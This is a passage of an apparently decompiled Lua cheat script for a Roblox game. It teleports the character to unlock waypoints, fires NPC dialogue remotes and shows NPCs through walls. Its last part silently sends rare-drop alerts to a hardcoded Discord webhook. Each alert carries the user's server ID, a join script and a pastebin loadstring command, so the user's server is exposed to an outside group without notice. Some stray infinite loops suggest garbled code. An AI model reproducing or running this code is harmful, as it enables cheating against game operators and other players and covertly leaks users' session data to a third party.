						{ name = "Ironkeep", cf = CFrame.new(850, 45, 550) },
						{ name = "CampZero", cf = CFrame.new(-100, 50, 300) },
						{ name = "Fissure", cf = CFrame.new(-300, 30, 400) },
						{ name = "Shimmer", cf = CFrame.new(300, 40, -700) },
						{ name = "Scorch", cf = CFrame.new(-800, 80, -400) },
						{ name = "Lone", cf = CFrame.new(-400, 120, -200) },
						{ name = "Aetherglow", cf = CFrame.new(600, -20, 200) },
						{ name = "Crypt", cf = CFrame.new(200, -100, -400) },
						{ name = "Cyst", cf = CFrame.new(1338, -550, 380) },
						{ name = "Manor", cf = CFrame.new(-500, 150, -800) },
						{ name = "Pale", cf = CFrame.new(0, 200, -1500) },
						{ name = "Colosseum", cf = CFrame.new(900, 30, -200) },
						{ name = "TheTwentyShelves", cf = CFrame.new(400, 60, 800) },
						{ name = "Sky", cf = CFrame.new(6, 1256, -6) },
					}

					local child = getChild()
					local cframe = nil

					if child then
						cframe = child.CFrame
					end

					fn16("Unlocking waypoints...", 3)

					for _, v30 in ipairs(tbl21) do
						local child2 = getChild()
						if not child2 then
							task.wait(1)
							continue
						end
						child2.CFrame = v30.cf
						child2.AssemblyLinearVelocity = Vector3.zero
						task.wait(3)
						local npCs2 = workspace:FindFirstChild("NPCs")
						if not npCs2 then
							continue
						end

						for _, child3 in ipairs(npCs2:GetChildren()) do
							if not (child3.Name:find("Obelisk") or child3.Name:find("Waypoint") or child3.Name:find("Pillar") or child3.Name:find("Shrine") or child3.Name:find("Monolith") or child3.Name:find("Beacon")) then
								continue
							end
							local npcDialogueConfig = child3:FindFirstChild("NPCDialogueConfig")
							if not npcDialogueConfig then
								continue
							end
							local flag12 = false

							pcall(function()
								local module = require(npcDialogueConfig)

								if module.messages then
									for _, message in ipairs(module.messages) do
										if message.event and type(message.event) == "table" and message.event.name == "GetWaypointEvent" then
											flag12 = true
										end
									end
								end
							end)

							if flag12 then
								local humanoidRootPart = child3:FindFirstChild("HumanoidRootPart") or child3:FindFirstChildWhichIsA("BasePart")

								if humanoidRootPart then
									child2.CFrame = CFrame.new(humanoidRootPart.Position + Vector3.new(0, 0, 3))
									child2.AssemblyLinearVelocity = Vector3.zero
									task.wait(0.5)
								end

								pcall(function()
									registerNPCInteraction2:FireServer(child3)
								end)

								task.wait(1)

								pcall(function()
									dialogEvent2:FireServer("response", 1)
								end)

								task.wait(1)

								pcall(function()
									dialogEvent2:FireServer("close")
								end)

								task.wait(0.5)
							end
						end
					end

					if cframe then
						local child2 = getChild()

						if child2 then
							child2.CFrame = cframe
							child2.AssemblyLinearVelocity = Vector3.zero
						end
					end

					fn16("Waypoints unlocked", 3)

					pcall(function()
						lib.Options.UnlockWaypoints:SetValue(false)
					end)
				end)
			end,
		})
	end

	do
		local v29 = tbl8.ESP:AddGroupbox("NPC ESP")
		local npCs2 = workspace:FindFirstChild("NPCs")
		local tbl19 = {}
		local connections2 = {}
		local npcEsp2 = false

		local function getHumanoidRootPart2(instance)
			return instance:FindFirstChild("HumanoidRootPart") or instance:FindFirstChild("Torso") or instance:FindFirstChild("Part") or instance:FindFirstChild("Head")
		end

		local function fn35(instance)
			if not instance or not instance:IsA("Model") then
				return
			end

			if not getHumanoidRootPart2(instance) then
				return
			end

			if tbl19[instance] then
				return
			end
			tbl19[instance] = true
			chEspLib:AddModelTarget(instance, instance.Name, getgenv()._CH_NpcESPColor)
			local str3 = "_model_" .. tostring(instance:GetDebugId())

			if chEspLib.Cache[str3] then
				chEspLib.Cache[str3]._isNpc = true
			end
		end

		local function fn36(child)
			if tbl19[child] then
				tbl19[child] = nil
				chEspLib:RemoveModelTarget(child)
			end
		end

		local function fn37()
			for k in pairs(tbl19) do
				chEspLib:RemoveModelTarget(k)
			end

			table.clear(tbl19)
		end

		tbl7.NpcESPColor = v29:AddColorPicker("NpcESPColor", {
			Default = Color3.fromRGB(255, 165, 0),
			Callback = function(color)
				getgenv()._CH_NpcESPColor = color

				for _, v30 in pairs(chEspLib.Cache) do
					if v30._isNpc then
						v30.CustomGradTop = color
						v30.CustomGradBot = color
						v30.LastGradTop = nil
						v30.LastGradBot = nil
						v30.LastGlowTop = nil
						v30.LastGlowBot = nil
						v30.LastFillTop = nil
						v30.LastFillBot = nil
					end
				end
			end,
		})

		tbl6.NpcESP = v29:AddToggle("NpcESP", {
			Text = "NPC ESP",
			Description = "See NPCs through walls",
			Default = false,
			Callback = function(npcEsp)
				npcEsp2 = npcEsp

				if npcEsp then
					local v30 = ipairs
					local children3 = npCs2 and npCs2:GetChildren() or {}

					for _, child in v30(children3) do
						if child:IsA("Model") then
							fn35(child)
						end
					end

					local connection17 = npCs2 and npCs2.ChildAdded:Connect(function(child)
						task.wait(0.5)

						if child:IsA("Model") and npcEsp2 then
							fn35(child)
						end
					end)

					local connection18 = npCs2 and npCs2.ChildRemoved:Connect(function(child)
						if child:IsA("Model") then
							fn36(child)
						end
					end)

					if connection17 then
						table.insert(connections2, connection17)
					end

					if connection18 then
						table.insert(connections2, connection18)
					end
				else
					fn37()

					for _, connection17 in ipairs(connections2) do
						pcall(function()
							connection17:Disconnect()
						end)
					end

					connections2 = {}
				end
			end,
		})

		fn15(function()
			npcEsp2 = false
			fn37()

			for _, connection17 in ipairs(connections2) do
				pcall(function()
					connection17:Disconnect()
				end)
			end

			connections2 = {}
		end)
	end

	fn15(function()
		pcall(function()
			service:UnbindFromRenderStep("CHSpeed")
		end)

		pcall(function()
			service:UnbindFromRenderStep("CHFly")
		end)

		pcall(function()
			service:UnbindFromRenderStep("CHNoSlow")
		end)

		getgenv()._CH_flyFrame = nil

		if connection4 then
			connection4:Disconnect()
			connection4 = nil
		end

		if connection then
			connection:Disconnect()
			connection = nil
		end

		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		if connection3 then
			connection3:Disconnect()
			connection3 = nil
		end

		if connection7 then
			connection7:Disconnect()
			connection7 = nil
		end

		flag10 = false

		if connection5 then
			connection5:Disconnect()
			connection5 = nil
		end

		if connection6 then
			connection6:Disconnect()
			connection6 = nil
		end

		if connection9 then
			connection9:Disconnect()
			connection9 = nil
		end

		if connection8 then
			connection8:Disconnect()
			connection8 = nil
		end

		if getgenv()._CHCrosshair then
			for _, v29 in ipairs(getgenv()._CHCrosshair) do
				pcall(function()
					v29:Remove()
				end)
			end

			getgenv()._CHCrosshair = nil
		end

		local character = getCharacter()

		if character then
			for _, descendant in ipairs(character:GetDescendants()) do
				if descendant:IsA("BasePart") then
					pcall(function()
						descendant.CanCollide = true
					end)
				end
			end

			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

			if humanoidRootPart then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
				end)

				pcall(function()
					humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
					do
						return
					end

					while true do
					end
				end)
			end

			local child = character:FindFirstChildOfClass("Humanoid")

			if child then
				pcall(function()
					child:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
					child:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
					child:SetStateEnabled(Enum.HumanoidStateType.Running, true)
					child:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)

					if child:GetState() == Enum.HumanoidStateType.Physics or child:GetState() == Enum.HumanoidStateType.FallingDown then
						child:ChangeState(Enum.HumanoidStateType.GettingUp)
					end
				end)
			end
		end

		pcall(function()
			currentCamera.CameraType = Enum.CameraType.Custom
		end)

		pcall(function()
			currentCamera.FieldOfView = 70
		end)

		pcall(function()
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		end)

		pcall(function()
			UserInputService.MouseIconEnabled = true
		end)

		pcall(function()
			localPlayer.CameraMinViewDistance = 0.5
		end)

		pcall(function()
			localPlayer.CameraMode = Enum.CameraMode.Classic
		end)

		local character2 = getCharacter()

		if character2 then
			local humanoid = character2:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)
			end
		end
	end)

	local tbl19 = {}
	local drops2 = workspace:FindFirstChild("Drops")
	local attributes = { Legendary = true, Mythic = true, Godly = true, Unobtainable = true, Christmas = true }

	local attributes2 = {
		Legendary = 16744448,
		Mythic = 16711680,
		Godly = 16711680,
		Unobtainable = 16711935,
		Christmas = 16732240,
		Elite = 10696174,
	}

	local function fn35(name, attribute, position)
		local str3 = game.JobId .. name .. attribute
		if tbl19[str3] then
			return
		end
		tbl19[str3] = true

		task.spawn(function()
			local request_ = request or syn and syn.request or http_request
			if not request_ then
				return
			end
			task.wait(0.3 + math.random() * 0.5)
			local HttpService = game:GetService("HttpService")
			local str4 = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. game.JobId .. "\")"
			local str5 = ""

			if position then
				do
					str5 = "loadstring(game:HttpGet(\"https://pastebin.com/raw/nd9mnqdP\"))(" .. string.format("%.1f, %.1f, %.1f", position.X, position.Y, position.Z) .. ")"
				end
			end

			local attribute2 = attributes2[attribute] or 16777215

			local tbl20 = {
				{ name = "Item", value = name, inline = true },
				{ name = "Rarity", value = attribute, inline = true },
				{
					name = "Players",
					value = tostring(#game:GetService("Players"):GetPlayers()) .. "/" .. game:GetService("Players").MaxPlayers,
					inline = true,
				},
				{ name = "Join Script", value = "```lua\n" .. str4 .. "\n```", inline = false },
			}

			if str5 ~= "" then
				table.insert(tbl20, { name = "Go To It", value = "```lua\n" .. str5 .. "\n```", inline = false })
			end

			local json = HttpService:JSONEncode({
				embeds = {
					{
						title = attribute .. " Drop Found!",
						description = "**" .. name .. "** has spawned on the ground.",
						color = attribute2,
						fields = tbl20,
						footer = { text = "discord.gg/cRExVjwvaG — The Veil" },
						timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
					},
				},
			})

			pcall(function()
				request_({
					Url = "https://discord.com/api/webhooks/1554590216973459590/m8XqEB_6k2oJv9i3jauqIDJGBTDvkzIi89ZwKHk6ufVeDr2dxxXQbbareD_KaVaR8t1E",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json",
					},
					Body = json,
				})
			end)
		end)
	end

	local v29 = ipairs
	local children3 = drops2 and drops2:GetChildren() or {}

	for _, child in v29(children3) do
		if child:IsA("Model") then
			local attribute = child:GetAttribute("Rarity") or "Common"

			if attributes[attribute] then
				local handle = child:FindFirstChild("Handle") or child:FindFirstChildWhichIsA("BasePart")
				fn35(child.Name, attribute, handle and handle.Position)
			end
		end
	end

	if drops2 then
		drops2.ChildAdded:Connect(function(child)
			task.wait(0.5)
			if not child:IsA("Model") then
				return
			end
			local attribute = child:GetAttribute("Rarity") or "Common"

			if attributes[attribute] then
				local handle = child:FindFirstChild("Handle") or child:FindFirstChildWhichIsA("BasePart")
				fn35(child.Name, attribute, handle and handle.Position)
			end
		end)
	end

	tbl8.ESP:Select()
	lib.Window:Init()
	return
end

while true do
end
